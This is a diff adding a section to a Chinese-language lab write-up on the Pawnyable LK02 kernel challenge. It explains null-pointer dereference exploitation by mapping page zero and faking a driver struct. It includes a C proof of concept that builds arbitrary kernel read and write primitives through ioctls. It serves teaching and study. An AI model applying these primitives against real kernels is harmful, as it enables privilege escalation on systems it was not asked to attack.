@@ -201,3 +201,151 @@ int main() {
 ![image-20250613113853323](Pawnyable_LK02_defence_null_poniter.assets/image-20250613113853323.png)
 
 会发现内核崩溃了，崩溃的原因是尝试对0000000000000008 进行解引用，也就是所谓的空指针解引用
+
+# 漏洞利用
+
+在Linux中，虚拟内存根据地址的不同用途也不同。例如，用户空间可以自由的使用0000000000000000 到 00007ffffffffffff 的区域。此外，从 ffffffff80000000 到 ffffffff9fffffff 的区域是内核数据区，映射到物理地址 0。
+
+而由用户可以自由的使用0000000000000000 到 00007ffffffffffff 的区域，所以当地址0被映射的时候，一个空指针是可以读写且不会引发段错误的。所以，在SMAP被禁用时，内核是可以通过解引用一个空指针来读取提前在地址0处准备好的攻击数据。
+
+在平时使用mmap时，将第一个参数置为0而不加其他标志位表示让内核决定将内存分配到什么位置上，也可以通过添加标志位来让内核从指定位置上分配内存，例如：
+
+```c
+mmap(0, 0x1000, PROT_READ|PROT_WRITE,
+     MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE,
+     -1, 0);
+```
+
+主要是这3个标志位：
+
+- MAP_FIXED：强制映射到第一个参数给定的地址（这里是 `0x0`）
+-  MAP_ANONYMOUS：映射的是匿名内存（也就是将fd置为-1，不与任何文件关联）
+- MAP_POPULATE：在 `mmap` 调用时立即将映射区域的页 **预先分配物理内存**；避免在后续访问时触发缺页异常（尤其在 KPTI 环境下，有时内核不允许低地址页懒加载）；
+
+这样就可以在0地址处强制映射一块0x1000大小的内存。然后结合驱动中的空指针解引用漏洞就可以控制利用这块0地址内存。
+
+**tips：这种利用手法在现在已经无法使用了，在Linux中现在引入了一个mmap_min_addr 的变量，用于限制mmap函数能够映射的最小虚拟地址**
+
+那么在利用思路上就很简单了。前面我们已经知道，在这个驱动中，程序不会对CMD_GETDATA以及CMD_ENCRYPT、CMD_DECRYPT操作进行初始化检查，那么我们只要在0地址处控制一个`XorCipher`结构体就可以通过对这个结构体进行读写来完成AAW和AAR。
+
+对于这个XorCipher结构体：
+
+```c
+typedef struct {
+  char *key;
+  char *data;
+  size_t keylen;
+  size_t datalen;
+} XorCipher;
+```
+
+结合CMD_GETDATA可以完成AAR，结合CMD_ENCRYPT、CMD_DECRYPT可以完成AAW。
+
+在CMD_GETDATA操作中，对于数据读取返回是这样的：
+
+```c
+if (copy_to_user(req.ptr, ctx->data, req.len)) return -EINVAL;
+```
+
+像copy_to_user这类的函数，即使传入的是未被映射的错误地址，内核也不会发生崩溃，在这种前提下，我们就可以选择使用爆破的方法来搜寻所需位置上的某些数据。
+
+下面我们进行一个测试，来验证这种利用方式的可行性：
+
+```c
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <unistd.h>
+
+#define CMD_INIT 0x13370001
+#define CMD_SETKEY 0x13370002
+#define CMD_SETDATA 0x13370003
+#define CMD_GETDATA 0x13370004
+#define CMD_ENCRYPT 0x13370005
+#define CMD_DECRYPT 0x13370006
+
+typedef struct {
+  char *key;
+  char *data;
+  size_t keylen;
+  size_t datalen;
+} XorCipher;
+
+typedef struct {
+  char *ptr;
+  size_t len;
+} request_t;
+
+XorCipher *nullptr = NULL;
+
+int fd = 0;
+
+int angus_getdata(char *data, size_t datalen) {
+  request_t req = {.ptr = data, .len = datalen};
+  return ioctl(fd, CMD_GETDATA, &req);
+}
+
+int angus_encrypt() {
+  request_t req = {NULL};
+  return ioctl(fd, CMD_ENCRYPT, &req);
+}
+int angus_decrypt() {
+  request_t req = {NULL};
+  return ioctl(fd, CMD_ENCRYPT, &req);
+}
+
+void AAR(char *dst, char *src, size_t len) {
+  nullptr->data = src;
+  nullptr->datalen = len;
+  angus_getdata(dst, len);
+}
+
+void AAW(char *dst, char *src, size_t len) {
+  // 由于驱动中对于数据的存储需要经过一个异或的操作，所以我们需要利用异或的自反性处理一下数据后传入
+  char *tmp = (char *)malloc(len);
+  if (tmp == NULL)
+    perror("tmp alloc fail!");
+  AAR(tmp, dst, len); // 将 dst 中的数据读到 tmp 中
+
+  for (int i = 0; i < len; i++) {
+    tmp[i] ^= src[i];
+    // 将要写入dst中的数据与原本dst中数据进行异或（利用异或的自反性）
+    // tmp(dst) ^ src ^ dst =src
+  }
+
+  nullptr->data = dst;
+  nullptr->datalen = len;
+  nullptr->key = tmp;
+  nullptr->keylen = len;
+
+  angus_encrypt();
+}
+
+int main() {
+  fd = open("/dev/angus", O_RDWR);
+
+  if (mmap(0, 0x1000, PROT_READ | PROT_WRITE,
+           MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1,
+           0) != NULL) // 在地址0处映射一块内存
+  {
+    perror("mmap failed");
+  }
+
+  char buf[0x10];
+  AAR(buf, "hello, world!", 13);
+  printf("AAR try to read buf: %s\n", buf);
+  AAW(buf, "this is a test", 14);
+  printf("AAW try to write buf:%s\n", buf);
+
+  close(fd);
+
+  return 0;
+}
+```
+
+这个POC中，我们并没有对XorCipher结构体进行初始化，但是我们可以通过对于0地址处的内存空间进行映射以完成对于这个指向NULL的XorCipher结构体指针中数据的控制：
+
+![image-20250619150558758](Pawnyable_LK02_defence_null_poniter.assets/image-20250619150558758.png)
+
